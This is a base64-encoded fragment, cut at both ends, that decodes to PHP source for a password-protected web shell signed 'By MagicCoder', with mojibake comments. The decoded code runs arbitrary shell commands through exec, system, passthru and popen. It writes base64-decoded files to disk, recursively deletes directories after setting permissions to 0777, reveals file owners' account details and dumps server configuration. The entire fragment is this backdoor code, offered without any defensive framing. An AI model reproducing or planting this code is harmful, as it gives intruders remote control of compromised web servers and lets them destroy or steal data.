yb3JzJykpLCANCiAgICAgICAgMTcgPT4gYXJyYXkoJ3JlZ2lzdGVyX2dsb2JhbHMnLGdldGNmZygncmVnaXN0ZXJfZ2xvYmFscycpKSwgDQogICAgICAgIDE4ID0+IGFycmF5KCdtYWdpY19xdW90ZXNfZ3BjJyxnZXRjZmcoJ21hZ2ljX3F1b3Rlc19ncGMnKSksIA0KICAgICAgICAxOSA9PiBhcnJheSgnbWVtb3J5X2xpbWl0JyxnZXRjZmcoJ21lbW9yeV9saW1pdCcpKSwgDQogICAgICAgIDIwID0+IGFycmF5KCdwb3N0X21heF9zaXplJyxnZXRjZmcoJ3Bvc3RfbWF4X3NpemUnKSksIA0KICAgICAgICAyMSA9PiBhcnJheSgndXBsb2FkX21heF9maWxlc2l6ZScsJHVwc2l6ZSksIA0KICAgICAgICAyMiA9PiBhcnJheSgnbWF4X2V4ZWN1dGlvbl90aW1lJyxnZXRjZmcoJ21heF9leGVjdXRpb25fdGltZScpLicgc2Vjb25kKHMpJyksIA0KICAgICAgICAyMyA9PiBhcnJheSgnZGlzYWJsZV9mdW5jdGlvbnMnLCRkaXNfZnVuYyksIA0KICAgICk7IA0KDQogICAgaWYoJHBocHZhcm5hbWUpIHsgDQogICAgICAgIG0oJHBocHZhcm5hbWUgLicgOiAnLmdldGNmZygkcGhwdmFybmFtZSkpOyANCiAgICB9IA0KDQogICAgZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J1NlcnZlciBlbnZpcm9ubWVudCcpKTsgDQogICAgbWFrZWhpZGUoJ2FjdGlvbicsJ3BocGVudicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J1BsZWFzZSBpbnB1dCBQSFAgY29uZmlndXJhdGlvbiBwYXJhbWV0ZXIoZWc6bWFnaWNfcXVvdGVzX2dwYyknLCduYW1lJz0+J3BocHZhcm5hbWUnLCd2YWx1ZSc9PiRwaHB2YXJuYW1lLCduZXdsaW5lJz0+MSkpOyANCiAgICBmb3JtZm9vdGVyKCk7IA0KDQogICAgJGhwID0gYXJyYXkoMD0+ICdTZXJ2ZXInLCAxPT4gJ1BIUCcpOyANCiAgICBmb3IoJGE9MDskYTwyOyRhKyspIHsgDQogICAgICAgIHAoJzxoMj4nLiRocFskYV0uJyAmcmFxdW87PC9oMj4nKTsgDQogICAgICAgIHAoJzx1bCBjbGFzcz0iaW5mbyI+Jyk7IA0KICAgICAgICBpZiAoJGE9PTApIHsgDQogICAgICAgICAgICBmb3IoJGk9MTskaTw9OTskaSsrKSB7IA0KICAgICAgICAgICAgICAgIHAoJzxsaT48dT4nLiRpbmZvWyRpXVswXS4nOjwvdT4nLiRpbmZvWyRpXVsxXS4nPC9saT4nKTsgDQogICAgICAgICAgICB9IA0KICAgICAgICB9IGVsc2VpZiAoJGEgPT0gMSkgeyANCiAgICAgICAgICAgIGZvcigkaT0xMDskaTw9MjM7JGkrKykgeyANCiAgICAgICAgICAgICAgICBwKCc8bGk+PHU+Jy4kaW5mb1skaV1bMF0uJzo8L3U+Jy4kaW5mb1skaV1bMV0uJzwvbGk+Jyk7IA0KICAgICAgICAgICAgfSANCiAgICAgICAgfSANCiAgICAgICAgcCgnPC91bD4nKTsgDQogICAgfSANCn0vL2VuZCBwaHBlbnYgDQoNCmVsc2UgeyANCiAgICBtKCdVbmRlZmluZWQgQWN0aW9uJyk7IA0KICAgIGVjaG8gJzxicj48YnI+JzsgDQovLyDQk+KAmtCS0IbQk9GT0JLCqdCT4oCa0JLRl9CT4oCa0JLSkVBIUElORk8gDQppZiAoJGFjdGlvbiA9PSAncGhwaW5mbycpIHsgDQogICAgaWYgKElTX1BIUElORk8pIHsgDQogICAgICAgIHBocGluZm8oKTsgDQogICAgfSBlbHNlIHsgDQogICAgICAgICRlcnJtc2cgPSAncGhwaW5mbygpIGZ1bmN0aW9uIGhhcyBub24tcGVybWlzc2libGUnOyANCiAgICB9IA0KfSANCg0KfSANCg0KPz4gDQo8L3RkPjwvdHI+PC90YWJsZT4gDQo8ZGl2IHN0eWxlPSJwYWRkaW5nOjEwcHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjtib3JkZXItdG9wOjFweCBzb2xpZCAjZGRkO2JhY2tncm91bmQ6I2VlZTsiPiANCiAgICA8c3BhbiBzdHlsZT0iZmxvYXQ6cmlnaHQ7Ij48P3BocCBkZWJ1Z2luZm8oKTtvYl9lbmRfZmx1c2goKTs/Pjwvc3Bhbj4gDQogICAgQnkgTWFnaWNDb2RlciANCjwvZGl2PiANCjwvYm9keT4gDQo8L2h0bWw+IA0KDQo8P3BocCANCg0KLyo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gDQrQk+KAmtCS0ZTQk+KAmtCS0IfQk9GT0JUg0JPRk9CS0IXQk+KAmtCS0ZfQk9GT0JLRniANCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSovIA0KDQpmdW5jdGlvbiBtKCRtc2cpIHsgDQogICAgZWNobyAnPGRpdiBzdHlsZT0iYmFja2dyb3VuZDojZjFmMWYxO2JvcmRlcjoxcHggc29saWQgI2RkZDtwYWRkaW5nOjE1cHg7Zm9udDoxNHB4O3RleHQtYWxpZ246Y2VudGVyO2ZvbnQtd2VpZ2h0OmJvbGQ7Ij4nOyANCiAgICBlY2hvICRtc2c7IA0KICAgIGVjaG8gJzwvZGl2Pic7IA0KfSANCmZ1bmN0aW9uIHNjb29raWUoJGtleSwgJHZhbHVlLCAkbGlmZSA9IDAsICRwcmVmaXggPSAxKSB7IA0KICAgIGdsb2JhbCAkYWRtaW4sICR0aW1lc3RhbXAsICRfU0VSVkVSOyANCiAgICAka2V5ID0gKCRwcmVmaXggPyAkYWRtaW5bJ2Nvb2tpZXByZSddIDogJycpLiRrZXk7IA0KICAgICRsaWZlID0gJGxpZmUgPyAkbGlmZSA6ICRhZG1pblsnY29va2llbGlmZSddOyANCiAgICAkdXNlcG9ydCA9ICRfU0VSVkVSWydTRVJWRVJfUE9SVCddID09IDQ0MyA/IDEgOiAwOyANCiAgICBzZXRjb29raWUoJGtleSwgJHZhbHVlLCAkdGltZXN0YW1wKyRsaWZlLCAkYWRtaW5bJ2Nvb2tpZXBhdGgnXSwgJGFkbWluWydjb29raWVkb21haW4nXSwgJHVzZXBvcnQpOyANCn0gICAgIA0KZnVuY3Rpb24gbXVsdGkoJG51bSwgJHBlcnBhZ2UsICRjdXJwYWdlLCAkdGFibGVuYW1lKSB7IA0KICAgICRtdWx0aXBhZ2UgPSAnJzsgDQogICAgaWYoJG51bSA+ICRwZXJwYWdlKSB7IA0KICAgICAgICAkcGFnZSA9IDEwOyANCiAgICAgICAgJG9mZnNldCA9IDU7IA0KICAgICAgICAkcGFnZXMgPSBAY2VpbCgkbnVtIC8gJHBlcnBhZ2UpOyANCiAgICAgICAgaWYoJHBhZ2UgPiAkcGFnZXMpIHsgDQogICAgICAgICAgICAkZnJvbSA9IDE7IA0KICAgICAgICAgICAgJHRvID0gJHBhZ2VzOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICAkZnJvbSA9ICRjdXJwYWdlIC0gJG9mZnNldDsgDQogICAgICAgICAgICAkdG8gPSAkY3VycGFnZSArICRwYWdlIC0gJG9mZnNldCAtIDE7IA0KICAgICAgICAgICAgaWYoJGZyb20gPCAxKSB7IA0KICAgICAgICAgICAgICAgICR0byA9ICRjdXJwYWdlICsgMSAtICRmcm9tOyANCiAgICAgICAgICAgICAgICAkZnJvbSA9IDE7IA0KICAgICAgICAgICAgICAgIGlmKCgkdG8gLSAkZnJvbSkgPCAkcGFnZSAmJiAoJHRvIC0gJGZyb20pIDwgJHBhZ2VzKSB7IA0KICAgICAgICAgICAgICAgICAgICAkdG8gPSAkcGFnZTsgDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgIH0gZWxzZWlmKCR0byA+ICRwYWdlcykgeyANCiAgICAgICAgICAgICAgICAkZnJvbSA9ICRjdXJwYWdlIC0gJHBhZ2VzICsgJHRvOyANCiAgICAgICAgICAgICAgICAkdG8gPSAkcGFnZXM7IA0KICAgICAgICAgICAgICAgIGlmKCgkdG8gLSAkZnJvbSkgPCAkcGFnZSAmJiAoJHRvIC0gJGZyb20pIDwgJHBhZ2VzKSB7IA0KICAgICAgICAgICAgICAgICAgICAkZnJvbSA9ICRwYWdlcyAtICRwYWdlICsgMTsgDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgIH0gDQogICAgICAgIH0gDQogICAgICAgICRtdWx0aXBhZ2UgPSAoJGN1cnBhZ2UgLSAkb2Zmc2V0ID4gMSAmJiAkcGFnZXMgPiAkcGFnZSA/ICc8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdcJywgMSk7Ij5GaXJzdDwvYT4gJyA6ICcnKS4oJGN1cnBhZ2UgPiAxID8gJzxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZW5hbWUuJ1wnLCBcJ1wnLCAnLigkY3VycGFnZSAtIDEpLicpOyI+UHJldjwvYT4gJyA6ICcnKTsgDQogICAgICAgIGZvcigkaSA9ICRmcm9tOyAkaSA8PSAkdG87ICRpKyspIHsgDQogICAgICAgICAgICAkbXVsdGlwYWdlIC49ICRpID09ICRjdXJwYWdlID8gJGkuJyAnIDogJzxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZW5hbWUuJ1wnLCBcJ1wnLCAnLiRpLicpOyI+WycuJGkuJ108L2E+ICc7IA0KICAgICAgICB9IA0KICAgICAgICAkbXVsdGlwYWdlIC49ICgkY3VycGFnZSA8ICRwYWdlcyA/ICc8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdcJywgJy4oJGN1cnBhZ2UgKyAxKS4nKTsiPk5leHQ8L2E+JyA6ICcnKS4oJHRvIDwgJHBhZ2VzID8gJyA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdcJywgJy4kcGFnZXMuJyk7Ij5MYXN0PC9hPicgOiAnJyk7IA0KICAgICAgICAkbXVsdGlwYWdlID0gJG11bHRpcGFnZSA/ICc8cD5QYWdlczogJy4kbXVsdGlwYWdlLic8L3A+JyA6ICcnOyANCiAgICB9IA0KICAgIHJldHVybiAkbXVsdGlwYWdlOyANCn0gDQovLyDQk+KAmtCSwrXQk9GT0LLQgtCO0JPRk9Cy0ILRmdCT4oCa0JLQhdCT0ZPQm+KAoNCT0ZPQksKr0JPigJrQktGX0JPRk9CV0I4gDQpmdW5jdGlvbiBsb2dpbnBhZ2UoKSB7IA0KPz4gDQogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4gDQogICAgaW5wdXQge2ZvbnQ6MTFweCBWZXJkYW5hO0JBQ0tHUk9VTkQ6ICNGRkZGRkY7aGVpZ2h0OiAxOHB4O2JvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7fSANCiAgICA8L3N0eWxlPiANCiAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIj4gDQogICAgPHNwYW4gc3R5bGU9ImZvbnQ6MTFweCBWZXJkYW5hOyI+UGFzc3dvcmQ6IDwvc3Bhbj48aW5wdXQgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIiBzaXplPSIyMCI+IA0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRvaW5nIiB2YWx1ZT0ibG9naW4iPiANCiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPiANCiAgICA8L2Zvcm0+IA0KPD9waHAgDQogICAgZXhpdDsgDQp9Ly9lbmQgbG9naW5wYWdlKCkgDQoNCmZ1bmN0aW9uIGV4ZWN1dGUoJGNmZSkgeyANCiAgICAkcmVzID0gJyc7IA0KICAgIGlmICgkY2ZlKSB7IA0KICAgICAgICBpZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkgeyANCiAgICAgICAgICAgIEBleGVjKCRjZmUsJHJlcyk7IA0KICAgICAgICAgICAgJHJlcyA9IGpvaW4oIlxuIiwkcmVzKTsgDQogICAgICAgIH0gZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKSB7IA0KICAgICAgICAgICAgJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOyANCiAgICAgICAgfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSkgeyANCiAgICAgICAgICAgIEBvYl9zdGFydCgpOyANCiAgICAgICAgICAgIEBzeXN0ZW0oJGNmZSk7IA0KICAgICAgICAgICAgJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsgDQogICAgICAgICAgICBAb2JfZW5kX2NsZWFuKCk7IA0KICAgICAgICB9IGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpIHsgDQogICAgICAgICAgICBAb2Jfc3RhcnQoKTsgDQogICAgICAgICAgICBAcGFzc3RocnUoJGNmZSk7IA0KICAgICAgICAgICAgJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsgDQogICAgICAgICAgICBAb2JfZW5kX2NsZWFuKCk7IA0KICAgICAgICB9IGVsc2VpZihAaXNfcmVzb3VyY2UoJGYgPSBAcG9wZW4oJGNmZSwiciIpKSkgeyANCiAgICAgICAgICAgICRyZXMgPSAnJzsgDQogICAgICAgICAgICB3aGlsZSghQGZlb2YoJGYpKSB7IA0KICAgICAgICAgICAgICAgICRyZXMgLj0gQGZyZWFkKCRmLDEwMjQpOyAgDQogICAgICAgICAgICB9IA0KICAgICAgICAgICAgQHBjbG9zZSgkZik7IA0KICAgICAgICB9IA0KICAgIH0gDQogICAgcmV0dXJuICRyZXM7IA0KfSANCmZ1bmN0aW9uIHdoaWNoKCRwcikgeyANCiAgICAkcGF0aCA9IGV4ZWN1dGUoIndoaWNoICRwciIpOyANCiAgICByZXR1cm4gKCRwYXRoID8gJHBhdGggOiAkcHIpOyAgDQp9IA0KDQpmdW5jdGlvbiBjZigkZm5hbWUsJHRleHQpeyANCiAgICBpZigkZnA9QGZvcGVuKCRmbmFtZSwndycpKSB7IA0KICAgICAgICBAZnB1dHMoJGZwLEBiYXNlNjRfZGVjb2RlKCR0ZXh0KSk7IA0KICAgICAgICBAZmNsb3NlKCRmcCk7IA0KICAgIH0gDQp9IA0KDQovLyDQk9GT0LLQguKEotCT4oCa0JLRltCT0ZPQluKAmdCT0ZPQksKm0JPigJrQksK10JPRk9CSwrfQk9GT0JUg0JPRk9Cy0ILRnNCT0ZPQv9GX0IXQk9GT0LLQgsKm0JPRk9C/0ZfQhdCT4oCa0JLRniANCmZ1bmN0aW9uIGRlYnVnaW5mbygpIHsgDQogICAgZ2xvYmFsICRzdGFydHRpbWU7IA0KICAgICRtdGltZSA9IGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSk7IA0KICAgICR0b3RhbHRpbWUgPSBudW1iZXJfZm9ybWF0KCgkbXRpbWVbMV0gKyAkbXRpbWVbMF0gLSAkc3RhcnR0aW1lKSwgNik7IA0KICAgIGVjaG8gJ1Byb2Nlc3NlZCBpbiAnLiR0b3RhbHRpbWUuJyBzZWNvbmQocyknOyANCn0gDQoNCi8v0JPRk9C/0ZfQhdCT4oCa0JLCrNCT4oCa0JLQhdCT0ZPQstCC0ZrQk9GT0JUg0JPRk9CS0IXQk+KAmtCS0ZXQk9GT0L/Rl9CF0JPigJrQktGX0JPRk9CS0Z4gDQpmdW5jdGlvbiBkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZT0nJywkY2hhcnNldD0nJywkZGJwb3J0PSczMzA2JykgeyANCiAgICBpZighJGxpbmsgPSBAbXlzcWxfY29ubmVjdCgkZGJob3N0Lic6Jy4kZGJwb3J0LCAkZGJ1c2VyLCAkZGJwYXNzKSkgeyANCiAgICAgICAgcCgnPGgyPkNhbiBub3QgY29ubmVjdCB0byBNeVNRTCBzZXJ2ZXI8L2gyPicpOyANCiAgICAgICAgZXhpdDsgDQogICAgfSANCiAgICBpZigkbGluayAmJiAkZGJuYW1lKSB7IA0KICAgICAgICBpZiAoIUBteXNxbF9zZWxlY3RfZGIoJGRibmFtZSwgJGxpbmspKSB7IA0KICAgICAgICAgICAgcCgnPGgyPkRhdGFiYXNlIHNlbGVjdGVkIGhhcyBlcnJvcjwvaDI+Jyk7IA0KICAgICAgICAgICAgZXhpdDsgDQogICAgICAgIH0gDQogICAgfSANCiAgICBpZigkbGluayAmJiBteXNxbF9nZXRfc2VydmVyX2luZm8oKSA+ICc0LjEnKSB7IA0KICAgICAgICBpZihpbl9hcnJheShzdHJ0b2xvd2VyKCRjaGFyc2V0KSwgYXJyYXkoJ2diaycsICdiaWc1JywgJ3V0ZjgnKSkpIHsgDQogICAgICAgICAgICBxKCJTRVQgY2hhcmFjdGVyX3NldF9jb25uZWN0aW9uPSRjaGFyc2V0LCBjaGFyYWN0ZXJfc2V0X3Jlc3VsdHM9JGNoYXJzZXQsIGNoYXJhY3Rlcl9zZXRfY2xpZW50PWJpbmFyeTsiLCAkbGluayk7IA0KICAgICAgICB9IA0KICAgIH0gDQogICAgcmV0dXJuICRsaW5rOyANCn0gDQoNCi8vINCT0ZPQm+KAoNCT4oCa0JLSkNCT4oCa0JLCtdCT0ZPQktKR0JPRk9Cy0ILigJ3Qk+KAmtCS0ITQk9GT0LLQguKEotCT0ZPQktKQ0JPRk9Cy0ILigJ3Qk9GT0LLQguKAnNCT4oCa0JLCt9CT0ZPQksK7IA0KZnVuY3Rpb24gc19hcnJheSgmJGFycmF5KSB7IA0KICAgIGlmIChpc19hcnJheSgkYXJyYXkpKSB7IA0KICAgICAgICBmb3JlYWNoICgkYXJyYXkgYXMgJGsgPT4gJHYpIHsgDQogICAgICAgICAgICAkYXJyYXlbJGtdID0gc19hcnJheSgkdik7IA0KICAgICAgICB9IA0KICAgIH0gZWxzZSBpZiAoaXNfc3RyaW5nKCRhcnJheSkpIHsgDQogICAgICAgICRhcnJheSA9IHN0cmlwc2xhc2hlcygkYXJyYXkpOyANCiAgICB9IA0KICAgIHJldHVybiAkYXJyYXk7IA0KfSANCg0KLy8g0JPRk9Cy0ILQjtCT0ZPQktKQ0JPigJrQktGW0JPRk9CS0IVIVE1M0JPigJrQktKR0JPRk9CS0ZTQk9GT0LLQgtGZ0JPRk9CSwqsgDQpmdW5jdGlvbiBodG1sX2NsZWFuKCRjb250ZW50KSB7IA0KICAgICRjb250ZW50ID0gaHRtbHNwZWNpYWxjaGFycygkY29udGVudCk7IA0KICAgICRjb250ZW50ID0gc3RyX3JlcGxhY2UoIlxuIiwgIjxiciAvPiIsICRjb250ZW50KTsgDQogICAgJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiICAiLCAiJm5ic3A7Jm5ic3A7IiwgJGNvbnRlbnQpOyANCiAgICAkY29udGVudCA9IHN0cl9yZXBsYWNlKCJcdCIsICImbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsiLCAkY29udGVudCk7IA0KICAgIHJldHVybiAkY29udGVudDsgDQp9IA0KDQovLyDQk+KAmtCSwrvQk9GT0JLCsdCT0ZPQm+KAoNCT4oCa0JLQjtCT0ZPQm+KAoNCT4oCa0JLQgdCT0ZPQv9GX0IXQk9GT0JXRlSANCmZ1bmN0aW9uIGdldENobW9kKCRmaWxlcGF0aCl7IA0KICAgIHJldHVybiBzdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJGZpbGVwYXRoKSwxMCw4KSwtNCk7IA0KfSANCg0KZnVuY3Rpb24gZ2V0UGVybXMoJGZpbGVwYXRoKSB7IA0KICAgICRtb2RlID0gQGZpbGVwZXJtcygkZmlsZXBhdGgpOyANCiAgICBpZiAoKCRtb2RlICYgMHhDMDAwKSA9PT0gMHhDMDAwKSB7JHR5cGUgPSAncyc7fSANCiAgICBlbHNlaWYgKCgkbW9kZSAmIDB4NDAwMCkgPT09IDB4NDAwMCkgeyR0eXBlID0gJ2QnO30gDQogICAgZWxzZWlmICgoJG1vZGUgJiAweEEwMDApID09PSAweEEwMDApIHskdHlwZSA9ICdsJzt9IA0KICAgIGVsc2VpZiAoKCRtb2RlICYgMHg4MDAwKSA9PT0gMHg4MDAwKSB7JHR5cGUgPSAnLSc7fSAgDQogICAgZWxzZWlmICgoJG1vZGUgJiAweDYwMDApID09PSAweDYwMDApIHskdHlwZSA9ICdiJzt9IA0KICAgIGVsc2VpZiAoKCRtb2RlICYgMHgyMDAwKSA9PT0gMHgyMDAwKSB7JHR5cGUgPSAnYyc7fSANCiAgICBlbHNlaWYgKCgkbW9kZSAmIDB4MTAwMCkgPT09IDB4MTAwMCkgeyR0eXBlID0gJ3AnO30gDQogICAgZWxzZSB7JHR5cGUgPSAnPyc7fSANCg0KICAgICRvd25lclsncmVhZCddID0gKCRtb2RlICYgMDA0MDApID8gJ3InIDogJy0nOyAgDQogICAgJG93bmVyWyd3cml0ZSddID0gKCRtb2RlICYgMDAyMDApID8gJ3cnIDogJy0nOyAgDQogICAgJG93bmVyWydleGVjdXRlJ10gPSAoJG1vZGUgJiAwMDEwMCkgPyAneCcgOiAnLSc7ICANCiAgICAkZ3JvdXBbJ3JlYWQnXSA9ICgkbW9kZSAmIDAwMDQwKSA/ICdyJyA6ICctJzsgIA0KICAgICRncm91cFsnd3JpdGUnXSA9ICgkbW9kZSAmIDAwMDIwKSA/ICd3JyA6ICctJzsgIA0KICAgICRncm91cFsnZXhlY3V0ZSddID0gKCRtb2RlICYgMDAwMTApID8gJ3gnIDogJy0nOyAgDQogICAgJHdvcmxkWydyZWFkJ10gPSAoJG1vZGUgJiAwMDAwNCkgPyAncicgOiAnLSc7ICANCiAgICAkd29ybGRbJ3dyaXRlJ10gPSAoJG1vZGUgJiAwMDAwMikgPyAndycgOiAnLSc7ICANCiAgICAkd29ybGRbJ2V4ZWN1dGUnXSA9ICgkbW9kZSAmIDAwMDAxKSA/ICd4JyA6ICctJzsgIA0KDQogICAgaWYoICRtb2RlICYgMHg4MDAgKSB7JG93bmVyWydleGVjdXRlJ10gPSAoJG93bmVyWydleGVjdXRlJ109PSd4JykgPyAncycgOiAnUyc7fSANCiAgICBpZiggJG1vZGUgJiAweDQwMCApIHskZ3JvdXBbJ2V4ZWN1dGUnXSA9ICgkZ3JvdXBbJ2V4ZWN1dGUnXT09J3gnKSA/ICdzJyA6ICdTJzt9IA0KICAgIGlmKCAkbW9kZSAmIDB4MjAwICkgeyR3b3JsZFsnZXhlY3V0ZSddID0gKCR3b3JsZFsnZXhlY3V0ZSddPT0neCcpID8gJ3QnIDogJ1QnO30gDQogIA0KICAgIHJldHVybiAkdHlwZS4kb3duZXJbJ3JlYWQnXS4kb3duZXJbJ3dyaXRlJ10uJG93bmVyWydleGVjdXRlJ10uJGdyb3VwWydyZWFkJ10uJGdyb3VwWyd3cml0ZSddLiRncm91cFsnZXhlY3V0ZSddLiR3b3JsZFsncmVhZCddLiR3b3JsZFsnd3JpdGUnXS4kd29ybGRbJ2V4ZWN1dGUnXTsgDQp9IA0KDQpmdW5jdGlvbiBnZXRVc2VyKCRmaWxlcGF0aCkgICAgeyANCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRwd3VpZCcpKSB7IA0KICAgICAgICAkYXJyYXkgPSBAcG9zaXhfZ2V0cHd1aWQoQGZpbGVvd25lcigkZmlsZXBhdGgpKTsgDQogICAgICAgIGlmICgkYXJyYXkgJiYgaXNfYXJyYXkoJGFycmF5KSkgeyANCiAgICAgICAgICAgIHJldHVybiAnIC8gPGEgaHJlZj0iIyIgdGl0bGU9IlVzZXI6ICcuJGFycmF5WyduYW1lJ10uJyYjMTMmIzEwUGFzc3dkOiAnLiRhcnJheVsncGFzc3dkJ10uJyYjMTMmIzEwVWlkOiAnLiRhcnJheVsndWlkJ10uJyYjMTMmIzEwZ2lkOiAnLiRhcnJheVsnZ2lkJ10uJyYjMTMmIzEwR2Vjb3M6ICcuJGFycmF5WydnZWNvcyddLicmIzEzJiMxMERpcjogJy4kYXJyYXlbJ2RpciddLicmIzEzJiMxMFNoZWxsOiAnLiRhcnJheVsnc2hlbGwnXS4nIj4nLiRhcnJheVsnbmFtZSddLic8L2E+JzsgDQogICAgICAgIH0gDQogICAgfSANCiAgICByZXR1cm4gJyc7IA0KfSANCg0KLy8g0JPRk9Cy0ILCsNCT4oCa0JLRldCT4oCa0JLRltCT0ZPQktCF0JPRk9Cy0ILRm9CT4oCa0JLRl9CT0ZPQstCC0ZnQk+KAmtCS0ZggDQpmdW5jdGlvbiBkZWx0cmVlKCRkZWxkaXIpIHsgDQogICAgJG15ZGlyPUBkaXIoJGRlbGRpcik7ICAgICANCiAgICB3aGlsZShAJGZpbGU9JG15ZGlyLT5yZWFkKCkpICAgIHsgICAgICAgICAgDQogICAgICAgIGlmKChpc19kaXIoJGRlbGRpci4nLycuJGZpbGUpKSAmJiAoJGZpbGUhPScuJykgJiYgKCRmaWxlIT0nLi4nKSkgeyAgDQogICAgICAgICAgICBAY2htb2QoJGRlbGRpci4nLycuJGZpbGUsMDc3Nyk7IA0KICAgICAgICAgICAgZGVsdHJlZSgkZGVsZGlyLicvJy4kZmlsZSk7ICANCiAgICAgICAgfSANCiAgICAgICAgaWYgKGlzX2ZpbGUoJGRlbGRpci4nLycuJGZpbGUpKSB7IA0KICAgICAgICAgICAgQGNobW9kKCRkZWxkaXIuJy8nLiRmaWxlLDA3NzcpOyANCiAgICAgICAgICAgIEB1bmxpbmsoJGRlbGRpci4nLycuJGZpbGUpOyANCiAgICAgICAgfSANCiAgICB9ICANCiAgICAkbXlkaXItPmNsb3NlKCk7ICANCiAgICBAY2htb2QoJGRlbGRpciwwNzc3KTsgDQogICAgcmV0dXJuIEBybWRpcigkZGVsZGlyKSA/IDEgOiAwOyANCn0gDQoNCi8vINCT4oCa0JLCsdCT0ZPQktCT4oCa0JLRkdCT0ZPQksKx0JPRk9C/0ZfQhdCT0ZPQv9GX0IXQk+KAmtCS0ZjQk9GT0JLCpNCT4oCa0JLCtdCT0ZPQstCC0ZvQk+KAmtCSwrHQk+KAmtCS0ZbQk+KAmtCS0ZXQk+KAmtCSwrDQk9GT0LLQgsKw0JPigJrQksKr0JPRk9CV4oCZ0JPRk9CSwqbQk+KAmtCSwrvQk+KAmtCSwrsgDQpmdW5jdGlvbiBiZygpIHsgDQogICAgZ2xvYmFsICRiZ2M7IA0KICAgIHJldHVybiAoJGJnYysrJTI9PTApID8gJ2FsdDEnIDogJ2FsdDInOyANCn0gDQoNCi8vINCT4oCa0JLCu9CT0ZPQksKx0JPRk9Cb4oCg0JPigJrQktCO0JPigJrQksK10JPigJrQksKx0JPRk9Cy0ILQjtCT4oCa0JLCsNCT4oCa0JLCtdCT0ZPQstCC0ZvQk9GT0JXQhdCT0ZPQstCC0ZvQk+KAmtCS0ZjQk9GT0JLRldCT0ZPQv9GX0IXQk+KAmtCSwrXQk9GT0L/Rl9CF0JPigJrQktGW0JPRk9Cy0ILRmdCT4oCa0JLCt9CT4oCa0JLRldCT4oCa0JLCtiANCmZ1bmN0aW9uIGdldFBhdGgoJHNjcmlwdHBhdGgsICRub3dwYXRoKSB7IA0KICAgIGlmICgkbm93cGF0aCA9PSAnLicpIHsgDQogICAgICAgICRub3dwYXRoID0gJHNjcmlwdHBhdGg7IA0KICAgIH0gDQogICAgJG5vd3BhdGggPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRub3dwYXRoKTsgDQogICAgJG5vd3BhdGggPSBzdHJfcmVwbGFjZSgnLy8nLCAnLycsICRub3dwYXRoKTsgDQogICAgaWYgKHN1YnN0cigkbm93cGF0aCwgLTEpICE9ICcvJykgeyANCiAgICAgICAgJG5vd3BhdGggPSAkbm93cGF0aC4nLyc7IA0KICAgIH0gDQogICAgcmV0dXJuICRub3dwYXRoOyANCn0gDQoNCi8vINCT4oCa0JLCu9CT0ZPQksKx0JPRk9Cb4oCg0JPigJrQktCO0JPigJrQksK10JPigJrQksKx0JPRk9Cy0ILQjtCT4oCa0JLCsNCT0ZPQstCC0ZvQk+KAmtCS0ZfQk9GT0LLQgtGZ0JPigJrQktGY0JPigJrQksK10JPRk9Cy0ILRm9CT0ZPQstCCwrDQk9GT0L/Rl9CF0JPigJrQktGY0JPigJrQksK20JPRk9Cy0ILRm9CT4oCa0JLRl9CT0ZPQstCC0ZnQk+KAmtCS0ZggDQpmdW5jdGlvbiBnZXRVcFBhdGgoJG5vd3BhdGgpIHsgDQogICAgJHBhdGhkYiA9IGV4cGxvZGUoJy8nLCAkbm93cGF0aCk7IA0KICAgICRudW0gPSBjb3VudCgkcGF0aGRiKTsgDQogICAgaWYgKCRudW0gPiAyKSB7IA0KICAgICAgICB1bnNldCgkcGF0aGRiWyRudW0tMV0sJHBhdGhkYlskbnVtLTJdKTsgDQogICAgfSANCiAgICAkdXBwYXRoID0gaW1wbG9kZSgnLycsICRwYXRoZGIpLicvJzsgDQogICAgJHVwcGF0aCA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJHVwcGF0aCk7IA0KICAgIHJldHVybiAkdXBwYXRoOyANCn0gDQoNCi8vINCT4oCa0JLRmNCT0ZPQksKs0JPigJrQktCG0JPRk9CSwqlQSFDQk9GT0LLQgsKm0JPRk9CSwqTQk9GT0LLQguKAnNCT0ZP